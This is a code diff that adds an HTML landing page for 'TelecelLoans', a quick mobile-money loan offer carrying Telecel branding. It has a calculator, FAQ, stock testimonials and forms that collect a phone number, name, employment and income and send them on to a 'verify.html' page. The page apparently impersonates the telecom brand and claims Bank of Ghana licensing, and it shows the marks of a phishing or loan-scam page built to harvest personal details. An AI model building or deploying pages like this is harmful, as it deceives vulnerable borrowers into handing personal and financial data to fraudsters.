+        <path d="M92.0261 94.9252C91.9993 95.1124 92.1792 95.5353 91.9604 95.6933C91.7076 95.8756 91.433 95.4964 91.1656 95.3724C89.6587 94.6724 88.1031 94.4634 86.4917 94.9835C84.9701 95.4745 83.9566 96.9377 84.0684 98.5322C84.2021 100.481 85.2813 101.954 86.8806 102.159C88.3608 102.348 89.8507 102.297 91.2677 101.716C91.817 101.49 91.8729 101.527 91.9313 102.129C92.15 104.341 91.1729 105.768 89.1021 106.541C84.433 108.284 78.7576 104.786 78.551 99.2613C78.5219 98.4617 78.5438 97.6815 78.641 96.8915C79.0931 93.2311 82.9212 90.2099 86.1514 90.0787C86.9681 90.0447 87.7677 90.0787 88.5649 90.2148C90.6188 90.5648 91.9142 92.0644 92.0236 94.1887C92.0333 94.3953 92.0236 94.5995 92.0236 94.9252H92.0261Z" fill="#E32527"/>
+        <path d="M117.893 91.6953C117.98 94.189 117.975 97.1178 117.978 100.044C117.978 100.265 117.978 100.487 118 100.705C118.072 101.515 118.746 102.142 119.555 102.207C120.051 102.246 120.547 102.275 121.045 102.28C121.376 102.283 121.538 102.397 121.531 102.742C121.519 103.316 121.558 103.889 121.483 104.461C121.351 105.467 120.795 106.14 119.847 106.458C117.844 107.132 115.948 106.918 114.244 105.63C112.963 104.662 112.443 103.27 112.412 101.729C112.327 97.604 112.234 93.4769 112.385 89.3498C112.434 88.0057 112.334 86.6616 112.346 85.3151C112.346 85.089 112.438 84.9408 112.674 84.9286C113.894 84.8703 115.124 84.7925 116.269 85.354C117.236 85.8279 117.754 86.6008 117.822 87.6897C117.895 88.8807 117.914 90.0717 117.895 91.6953H117.893Z" fill="#E32527"/>
+        <path d="M50.1509 93.168C50.1509 90.6378 50.1509 88.11 50.1509 85.5798C50.1509 84.9722 50.2019 84.926 50.8023 84.909C51.772 84.8823 52.7394 84.8652 53.68 85.1934C54.9196 85.6284 55.5516 86.5059 55.6391 87.7965C55.6512 87.9861 55.6536 88.1781 55.6561 88.3701C55.7266 92.2225 55.7436 96.0725 55.7363 99.925C55.7363 100.234 55.7509 100.54 55.8141 100.846C55.9964 101.721 56.4557 102.139 57.3575 102.202C57.8557 102.239 58.354 102.273 58.8523 102.275C59.1901 102.275 59.3457 102.416 59.3384 102.744C59.3238 103.488 59.3043 104.232 59.1561 104.964C59.0613 105.435 58.772 105.86 58.3564 106.103C55.8311 107.586 51.7064 106.777 50.5495 103.534C50.2165 102.606 50.1752 101.631 50.1654 100.664C50.1411 98.1652 50.1582 95.6642 50.1582 93.1656H50.1484L50.1509 93.168Z" fill="#E32527"/>
+      </svg>
+      <div>
+        <div class="logo-name"><span class="t1">Telecel</span><span class="t2">Loans</span></div>
+        <span class="logo-tag">Flex Loans</span>
+      </div>
+    </a>
+
+    <nav class="desktop-nav">
+      <a href="#home" class="active">Home</a>
+      <a href="#calculator">Calculator</a>
+      <a href="#how">How It Works</a>
+      <a href="#benefits">Benefits</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+
+    <div style="display:flex;align-items:center;gap:10px;">
+      <button class="btn-login" onclick="openLoginModal()">Login</button>
+      <button class="hamburger" id="hamburger" onclick="toggleMobileNav()" aria-label="Menu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</header>
+
+<!-- Mobile Nav -->
+<div class="mobile-nav" id="mobileNav">
+  <a href="#home" onclick="closeMobileNav()">Home</a>
+  <a href="#calculator" onclick="closeMobileNav()">Calculator</a>
+  <a href="#how" onclick="closeMobileNav()">How It Works</a>
+  <a href="#benefits" onclick="closeMobileNav()">Benefits</a>
+  <a href="#faq" onclick="closeMobileNav()">FAQ</a>
+  <button class="mob-login" onclick="closeMobileNav(); openLoginModal();">Login to Your Account</button>
+</div>
+
+<!-- HERO -->
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div class="hero-text">
+      <div class="hero-badge"><span class="dot"></span> Telecel Subscribers Only</div>
+      <h1 class="hero-title">Telecel users are eligible for Flex Loans</h1>
+      <p class="hero-desc">Get up to GHS 50,000 approved in 15 minutes, directly into your Telecel Cash wallet. Flexible terms, clear rates, no hidden charges.</p>
+      <div style="display:flex;gap:12px;margin-top:28px;flex-wrap:wrap;">
+        <button class="btn-apply" style="width:auto;padding:12px 28px;" onclick="openApplicationModal()">Apply Now</button>
+        <a href="#how" style="display:inline-flex;align-items:center;padding:12px 24px;background:rgba(255,255,255,0.15);color:white;border-radius:6px;font-size:14px;font-weight:500;text-decoration:none;transition:background 0.18s;" onmouseover="this.style.background='rgba(255,255,255,0.25)'" onmouseout="this.style.background='rgba(255,255,255,0.15)'">How It Works</a>
+      </div>
+    </div>
+
+    <!-- CALCULATOR -->
+    <div class="calc-card" id="calculator">
+      <div class="calc-head">
+        <div class="calc-head-icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E30613" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="18" rx="2"/><path d="M8 9h8M8 13h5M8 17h3"/></svg>
+        </div>
+        <div>
+          <div class="calc-head-title">Loan Calculator</div>
+          <div class="calc-head-sub">See your repayment instantly</div>
+        </div>
+      </div>
+      <div class="calc-body">
+        <div class="calc-field">
+          <label class="calc-label">Loan Amount</label>
+          <div class="amount-display"><span>GHS</span><span id="amountDisplay">1,000</span></div>
+          <input type="range" id="loanSlider" min="1000" max="50000" value="1000" step="500" oninput="updateCalc()">
+          <div class="range-labels"><span>GHS 1,000</span><span>GHS 50,000</span></div>
+        </div>
+        <div class="calc-field">
+          <label class="calc-label">Repayment Period</label>
+          <div class="period-grid" id="periodGrid">
+            <button class="period-btn active" data-months="1" onclick="selectPeriod(1)">1 Month</button>
+            <button class="period-btn" data-months="2" onclick="selectPeriod(2)">2 Months</button>
+            <button class="period-btn" data-months="3" onclick="selectPeriod(3)">3 Months</button>
+            <button class="period-btn" data-months="4" onclick="selectPeriod(4)">4 Months</button>
+            <button class="period-btn" data-months="5" onclick="selectPeriod(5)">5 Months</button>
+            <button class="period-btn" data-months="6" onclick="selectPeriod(6)">6 Months</button>
+          </div>
+        </div>
+        <div class="calc-result">
+          <div class="cr-item">
+            <div class="cr-label">Monthly Payment</div>
+            <div class="cr-val" id="monthlyDisplay">GHS 1,089</div>
+          </div>
+          <div class="cr-divider"></div>
+          <div class="cr-item" style="text-align:right;">
+            <div class="cr-label">Total Repayment</div>
+            <div class="cr-val green" id="repayDisplay">GHS 1,089</div>
+          </div>
+        </div>
+        <div class="calc-note">Rate: 8.9% per month &nbsp;·&nbsp; <span id="rateNote">1 month</span></div>
+        <button class="btn-apply" onclick="openApplicationModal()">Apply Now →</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- STATS -->
+<div class="stats-bar">
+  <div class="stats-inner">
+    <div class="stat-item"><div class="stat-val">15 min</div><div class="stat-label">Approval Time</div></div>
+    <div class="stat-item"><div class="stat-val">GHS 50K</div><div class="stat-label">Max Loan</div></div>
+    <div class="stat-item"><div class="stat-val">8.9%</div><div class="stat-label">Monthly Rate</div></div>
+    <div class="stat-item"><div class="stat-val">6 Mo.</div><div class="stat-label">Max Term</div></div>
+  </div>
+</div>
+
+<!-- HOW IT WORKS -->
+<section class="section hiw" id="how">
+  <div class="section-inner">
+    <div class="section-header">
+      <div class="section-tag">Simple Process</div>
+      <h2 class="section-title">How to Apply</h2>
+      <p class="section-sub">Four easy steps and your funds are in your Telecel Cash account in under 15 minutes.</p>
+    </div>
+    <div class="steps-grid">
+      <div class="step-card">
+        <div class="step-num">1</div>
+        <div class="step-title">Fill Application</div>
+        <p class="step-desc">Complete your application with basic personal and income details. Takes under 2 minutes from your phone.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">2</div>
+        <div class="step-title">Verify Identity</div>
+        <p class="step-desc">Confirm your Telecel number. Our system instantly verifies your account and eligibility in real-time.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">3</div>
+        <div class="step-title">Get Approved</div>
+        <p class="step-desc">Receive your approval decision in under 15 minutes. Fully automated — no waiting, no paperwork.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">4</div>
+        <div class="step-title">Receive Funds</div>
+        <p class="step-desc">Your approved amount is transferred directly into your Telecel Cash account — instantly available to use.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BENEFITS -->
+<section class="section" id="benefits">
+  <div class="section-inner">
+    <div class="section-header">
+      <div class="section-tag">Why Us</div>
+      <h2 class="section-title">Built for Telecel Users</h2>
+      <p class="section-sub">Everything you need, designed around your Telecel life.</p>
+    </div>
+    <div class="benefits-grid">
+      <div class="benefit-card">
+        <span class="benefit-icon">⚡</span>
+        <div class="benefit-title">Fast Approval</div>
+        <p class="benefit-desc">Approved in just 15 minutes. Our instant verification system processes your application in real-time, 24/7.</p>
+      </div>
+      <div class="benefit-card">
+        <span class="benefit-icon">💰</span>
+        <div class="benefit-title">Flexible Terms</div>
+        <p class="benefit-desc">Choose repayment from 1 to 6 months. Pick what fits your budget — no penalty for early repayment.</p>
+      </div>
+      <div class="benefit-card">
+        <span class="benefit-icon">🔒</span>
+        <div class="benefit-title">Secure & Safe</div>
+        <p class="benefit-desc">Bank-level 256-bit encryption protects your data. Your information is never shared without your consent.</p>
+      </div>
+      <div class="benefit-card">
+        <span class="benefit-icon">📲</span>
+        <div class="benefit-title">Mobile-First</div>
+        <p class="benefit-desc">Everything on your phone. Apply, track, and repay directly through Telecel Cash — no branch visit needed.</p>
+      </div>
+      <div class="benefit-card">
+        <span class="benefit-icon">🎯</span>
+        <div class="benefit-title">Transparent Rates</div>
+        <p class="benefit-desc">What you see is what you pay. No hidden charges. Our calculator shows your exact repayment upfront.</p>
+      </div>
+      <div class="benefit-card">
+        <span class="benefit-icon">📈</span>
+        <div class="benefit-title">Grow Your Limit</div>
+        <p class="benefit-desc">The more consistently you use Telecel, the higher your eligible loan amount. Loyalty is rewarded.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="section faq" id="faq">
+  <div class="section-inner">
+    <div class="section-header" style="text-align:center;">
+      <div class="section-tag">Got Questions?</div>
+      <h2 class="section-title">Frequently Asked Questions</h2>
+    </div>
+    <div class="faq-wrap">
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>How long does approval take?</span><div class="faq-arrow">▼</div></div>
+        <div class="faq-ans"><div class="faq-ans-text">Most applications are approved within 15 minutes. Our instant verification system checks your eligibility in real-time, any time of day, including weekends and public holidays.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>Who is eligible for TelecelLoans?</span><div class="faq-arrow">▼</div></div>
+        <div class="faq-ans"><div class="faq-ans-text">Only active Telecel subscribers are eligible. You need to be at least 18 years old with a registered Telecel Cash account and a verifiable income source. The longer your Telecel history, the higher your eligible amount.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>What is the maximum loan amount?</span><div class="faq-arrow">▼</div></div>
+        <div class="faq-ans"><div class="faq-ans-text">You can borrow between GHS 1,000 and GHS 50,000 depending on your Telecel subscriber history, income level, and credit profile. First-time borrowers may start at a lower limit which increases with good repayment behaviour.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>What is the interest rate?</span><div class="faq-arrow">▼</div></div>
+        <div class="faq-ans"><div class="faq-ans-text">A flat monthly rate of 8.9% applies to all loans. This is calculated on the principal for each month of your chosen repayment period. All amounts are shown upfront in the calculator — no surprises at repayment time.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>How do I repay my loan?</span><div class="faq-arrow">▼</div></div>
+        <div class="faq-ans"><div class="faq-ans-text">Repayment is automatic — the total amount is deducted from your Telecel Cash account on the due date. You can also make early repayments any time without any penalty fee.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>Is my personal data secure?</span><div class="faq-arrow">▼</div></div>
+        <div class="faq-ans"><div class="faq-ans-text">Yes. We use 256-bit bank-level encryption and strict security protocols. Your data is never sold or shared with third parties without your explicit consent.</div></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>What happens if I miss a repayment?</span><div class="faq-arrow">▼</div></div>
+        <div class="faq-ans"><div class="faq-ans-text">Missing a repayment may affect your future borrowing limit and incur a small late fee. We recommend ensuring sufficient funds in your Telecel Cash account before the due date. Contact support if you anticipate difficulty.</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TESTIMONIALS -->
+<section class="section testimonials" id="testimonials">
+  <div class="section-inner">
+    <div class="section-tag">Customer Stories</div>
+    <h2 class="section-title">What Our Customers Say</h2>
+    <p class="section-sub">Thousands of Telecel subscribers trust TelecelLoans for their financial needs.</p>
+    <button class="t-toggle-btn" id="tToggle" onclick="toggleTestimonials()">
+      Read testimonials <span class="t-arrow-ico">▼</span>
+    </button>
+    <div class="t-grid" id="tGrid">
+      <div class="t-card">
+        <div class="t-stars">★★★★★</div>
+        <p class="t-text">"Fast, reliable, and easy to use. I got my loan approved in just 15 minutes. Highly recommended for any Telecel user!"</p>
+        <div class="t-name">Kwame Asante</div>
+        <div class="t-role">Business Owner, Accra</div>
+      </div>
+      <div class="t-card">
+        <div class="t-stars">★★★★★</div>
+        <p class="t-text">"No hidden fees, no surprises. Exactly what I needed when I needed it most. The process was incredibly simple."</p>
+        <div class="t-name">Ama Osei</div>
+        <div class="t-role">Entrepreneur, Kumasi</div>
+      </div>
+      <div class="t-card">
+        <div class="t-stars">★★★★★</div>
+        <p class="t-text">"TelecelLoans helped me expand my shop stock. The flexible repayment terms made it so easy to manage without stress."</p>
+        <div class="t-name">Yaw Mensah</div>
+        <div class="t-role">Trader, Takoradi</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- LOGIN MODAL -->
+<div class="modal-overlay" id="loginModal">
+  <div class="modal-box">
+    <div class="modal-head">
+      <div class="modal-head-text">
+        <h2>Login to TelecelLoans</h2>
+        <div class="mh-sub">Enter your Telecel number to continue</div>
+      </div>
+      <button class="modal-close" onclick="closeLoginModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="fgroup">
+        <label class="flabel">Telecel Phone Number</label>
+        <input type="tel" class="finput" id="loginPhone" placeholder="050XXXXXXXX" maxlength="10" inputmode="numeric">
+      </div>
+      <div class="modal-btns">
+        <button class="btn-primary" onclick="verifyLogin()">Verify & Continue →</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- APPLICATION MODAL -->
+<div class="modal-overlay" id="applicationModal">
+  <div class="modal-box">
+    <div class="modal-head">
+      <div class="modal-head-text">
+        <h2>Apply for Flex Loan</h2>
+        <div class="mh-sub" id="modalSubtitle">Step 1 of 3 — Your Details</div>
+      </div>
+      <button class="modal-close" onclick="closeApplicationModal()">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="prog-bar">
+        <div class="prog-seg active" id="seg1"></div>
+        <div class="prog-seg" id="seg2"></div>
+        <div class="prog-seg" id="seg3"></div>
+      </div>
+
+      <!-- STEP 1 -->
+      <div id="step1" class="step-content">
+        <div class="loan-summary">
+          <div class="ls-item">
+            <div class="ls-label">Loan Amount</div>
+            <div class="ls-val">GHS <span id="sumAmount">1,000</span></div>
+          </div>
+          <div class="ls-item" style="text-align:right;">
+            <div class="ls-label">Total Repayment</div>
+            <div class="ls-val green">GHS <span id="sumRepay">1,089</span></div>
+          </div>
+        </div>
+        <div class="fgroup">
+          <label class="flabel">Full Name</label>
+          <input type="text" class="finput" id="fullName" placeholder="e.g. Kwame Asante">
+        </div>
+        <div class="fgroup">
+          <label class="flabel">Telecel Phone Number</label>
+          <input type="tel" class="finput" id="appPhone" placeholder="050XXXXXXXX" maxlength="10" inputmode="numeric">
+        </div>
+        <div class="frow">
+          <div class="fgroup">
+            <label class="flabel">Employment Status</label>
+            <select class="finput" id="employment" style="appearance:auto;-webkit-appearance:auto;">
+              <option value="">Select…</option>
+              <option value="Employed">Employed</option>
+              <option value="Self-Employed">Self-Employed</option>
+              <option value="Business Owner">Business Owner</option>
+              <option value="Student">Student</option>
+              <option value="Other">Other</option>
+            </select>
+          </div>
+          <div class="fgroup">
+            <label class="flabel">Monthly Income (GHS)</label>
+            <input type="number" class="finput" id="income" placeholder="e.g. 2000" min="0">
+          </div>
+        </div>
+        <div class="modal-btns">
+          <button class="btn-primary" onclick="goToStep(2)">Review Details →</button>
+        </div>
+      </div>
+
+      <!-- STEP 2 -->
+      <div id="step2" class="step-content" style="display:none;">
+        <p style="font-size:15px;font-weight:600;color:var(--black);margin-bottom:14px;">Review Your Information</p>
+        <div class="review-box">
+          <div class="review-row"><span class="rr-label">Full Name</span><span class="rr-val" id="revName">—</span></div>
+          <div class="review-row"><span class="rr-label">Phone Number</span><span class="rr-val" id="revPhone">—</span></div>
+          <div class="review-row"><span class="rr-label">Employment</span><span class="rr-val" id="revEmployment">—</span></div>
+          <div class="review-row"><span class="rr-label">Monthly Income</span><span class="rr-val" id="revIncome">—</span></div>
+        </div>
+        <div class="review-box">
+          <div class="review-row"><span class="rr-label">Loan Amount</span><span class="rr-val" id="revAmount">—</span></div>
+          <div class="review-row"><span class="rr-label">Repayment Period</span><span class="rr-val" id="revDays">—</span></div>
+          <div class="review-row"><span class="rr-label">Interest Rate</span><span class="rr-val" id="revRate">—</span></div>
+          <div class="review-row"><span class="rr-label">Total Repayment</span><span class="rr-val" id="revTotal" style="color:var(--green);">—</span></div>
+        </div>
+        <div class="modal-btns">
+          <button class="btn-primary" onclick="goToStep(3)">Confirm & Proceed →</button>
+          <button class="btn-secondary" onclick="goToStep(1)">← Back</button>
+        </div>
+      </div>
+
+      <!-- STEP 3 -->
+      <div id="step3" class="step-content" style="display:none;">
+        <div class="success-wrap">
+          <div class="success-icon">✓</div>
+          <div class="success-title">Application Submitted!</div>
+          <p class="success-desc">Your application has been received. You'll be redirected to the verification page to finalise your loan.</p>
+        </div>
+        <div class="review-box" style="margin-top:20px;">
+          <div class="review-row"><span class="rr-label">Amount Borrowed</span><span class="rr-val">GHS <span id="finalAmt">—</span></span></div>
+          <div class="review-row"><span class="rr-label">Repayment Amount</span><span class="rr-val" style="color:var(--green);">GHS <span id="finalRepay">—</span></span></div>
+        </div>
+        <div class="modal-btns">
+          <button class="btn-primary" onclick="submitApplication()">Go to Verification →</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6a16f9ea1289271c3250f6c7/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div class="footer-top">
+      <div class="footer-brand">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+          <div style="font-size:18px;font-weight:700;"><span style="color:#E30613;">Telecel</span><span style="color:#0066CC;">Loans</span></div>
+        </div>
+        <div class="footer-divider"></div>
+        <p>Fast, secure, and flexible Flex Loans exclusively for Telecel subscribers across Ghana. Licensed and regulated.</p>
+      </div>
+      <div class="footer-col">
+        <h4>Product</h4>
+        <a href="#calculator">Loan Calculator</a>
+        <a href="#benefits">Benefits</a>
+        <a href="#how">How It Works</a>
+        <a href="#faq">FAQ</a>
+      </div>
+      <div class="footer-col">
+        <h4>Company</h4>
+        <a href="#">About Us</a>
+        <a href="#">Contact</a>
+        <a href="#">Blog</a>
+      </div>
+      <div class="footer-col">
+        <h4>Legal & Support</h4>
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Loan Agreement</a>
+        <a href="#">Help Centre</a>
+        <a href="#">Report Issue</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2026 TelecelLoans. All rights reserved.</p>
+      <div class="footer-badge"><div class="footer-badge-dot"></div> Licensed & regulated by Bank of Ghana</div>
+    </div>
+  </div>
+</footer>
+
+<script>
+  const MONTHLY_RATE = 0.089;
+  let selectedMonths = 1;
+
+  function selectPeriod(months) {
+    selectedMonths = months;
+    document.querySelectorAll('.period-btn').forEach(btn => {
+      btn.classList.toggle('active', parseInt(btn.dataset.months) === months);
+    });
+    updateCalc();
+  }
+
+  function updateCalc() {
+    const slider = document.getElementById('loanSlider');
+    let amount = parseInt(slider.value) || 1000;
+    amount = Math.max(1000, Math.min(50000, amount));
+
+    document.getElementById('amountDisplay').textContent = amount.toLocaleString();
+
+    const totalInterest = amount * MONTHLY_RATE * selectedMonths;
+    const total = Math.round(amount + totalInterest);
+    const monthly = Math.round(total / selectedMonths);
+
+    document.getElementById('monthlyDisplay').textContent = 'GHS ' + monthly.toLocaleString();
+    document.getElementById('repayDisplay').textContent = 'GHS ' + total.toLocaleString();
+    document.getElementById('rateNote').textContent = selectedMonths + ' month' + (selectedMonths > 1 ? 's' : '');
+    document.getElementById('sumAmount').textContent = amount.toLocaleString();
+    document.getElementById('sumRepay').textContent = total.toLocaleString();
+
+    window.loanData = {
+      amount, months: selectedMonths,
+      rate: MONTHLY_RATE,
+      total,
+      monthly,
+      interest: Math.round(totalInterest)
+    };
+  }
+
+  /* Mobile Nav */
+  function toggleMobileNav() {
+    document.getElementById('mobileNav').classList.toggle('open');
+    document.getElementById('hamburger').classList.toggle('open');
+  }
+  function closeMobileNav() {
+    document.getElementById('mobileNav').classList.remove('open');
+    document.getElementById('hamburger').classList.remove('open');
+  }
+
+  /* Login Modal */
+  function openLoginModal() {
+    document.getElementById('loginModal').classList.add('open');
+  }
+  function closeLoginModal() {
+    document.getElementById('loginModal').classList.remove('open');
+  }
+  function verifyLogin() {
+    const phone = document.getElementById('loginPhone').value.trim();
+    if (!phone || phone.length < 9) { alert('Please enter a valid Telecel number.'); return; }
+    document.getElementById('appPhone').value = phone;
+    closeLoginModal();
+    const d = window.loanData || { amount: 1000, months: 1, total: 1089, interest: 89 };
+    const params = new URLSearchParams({
+      phone, amount: d.amount, days: d.months * 30,
+      fee: d.interest, repay: d.total, name: '', employment: '', income: ''
+    });
+    window.location.href = 'verify.html?' + params.toString();
+  }
+
+  /* Application Modal */
+  function openApplicationModal() {
+    updateCalc();
+    document.getElementById('applicationModal').classList.add('open');
+    goToStep(1);
+  }
+  function closeApplicationModal() {
+    document.getElementById('applicationModal').classList.remove('open');
+  }
+  function goToStep(step) {
+    document.querySelectorAll('.step-content').forEach(s => s.style.display = 'none');
+    document.getElementById('step' + step).style.display = 'block';
+    ['seg1','seg2','seg3'].forEach((id, i) => {
+      document.getElementById(id).classList.toggle('active', i < step);
+    });
+    const subs = ['Step 1 of 3 — Your Details','Step 2 of 3 — Review Information','Step 3 of 3 — Confirmation'];
+    document.getElementById('modalSubtitle').textContent = subs[step - 1];
+    if (step === 2) populateReview();
+    if (step === 3) populateFinal();
+  }
+  function populateReview() {
+    const d = window.loanData;
+    document.getElementById('revName').textContent       = document.getElementById('fullName').value || '—';
+    document.getElementById('revPhone').textContent      = document.getElementById('appPhone').value || '—';
+    document.getElementById('revEmployment').textContent = document.getElementById('employment').value || '—';
+    document.getElementById('revIncome').textContent     = 'GHS ' + (parseInt(document.getElementById('income').value)||0).toLocaleString();
+    document.getElementById('revAmount').textContent     = 'GHS ' + d.amount.toLocaleString();
+    document.getElementById('revDays').textContent       = d.months + ' month' + (d.months > 1 ? 's' : '');
+    document.getElementById('revRate').textContent       = '8.9% per month';
+    document.getElementById('revTotal').textContent      = 'GHS ' + d.total.toLocaleString();
+  }
+  function populateFinal() {
+    const d = window.loanData;
+    document.getElementById('finalAmt').textContent   = d.amount.toLocaleString();
+    document.getElementById('finalRepay').textContent = d.total.toLocaleString();
+  }
+  function submitApplication() {
+    const d = window.loanData;
+    const name       = document.getElementById('fullName').value;
+    const phone      = document.getElementById('appPhone').value;
+    const employment = document.getElementById('employment').value;
+    const income     = document.getElementById('income').value;
+    const payload = {
+      fullName: name, phone, employment, income,
+      loanAmount: d.amount,
+      repaymentMonths: d.months,
+      interestRate: '8.9%',
+      totalRepayment: d.total,
+      totalInterest: d.interest,
+      timestamp: new Date().toISOString()
+    };
+    sessionStorage.setItem('loanApplicationData', JSON.stringify(payload));
+    const params = new URLSearchParams({
+      phone, amount: d.amount, days: d.months * 30,
+      fee: d.interest, repay: d.total,
+      name, employment, income
+    });
+    window.location.href = 'verify.html?' + params.toString();
+  }
+
+  /* FAQ */
+  function toggleFaq(el) { el.parentElement.classList.toggle('open'); }
+
+  /* Testimonials */
+  function toggleTestimonials() {
+    document.getElementById('tToggle').classList.toggle('open');
+    document.getElementById('tGrid').classList.toggle('open');
+  }
+
+  /* Close modals on backdrop click */
+  document.getElementById('loginModal').addEventListener('click', function(e) { if (e.target === this) closeLoginModal(); });
+  document.getElementById('applicationModal').addEventListener('click', function(e) { if (e.target === this) closeApplicationModal(); });
+
+  /* Init */
+  updateCalc();
+</script>
+</body>
+</html>
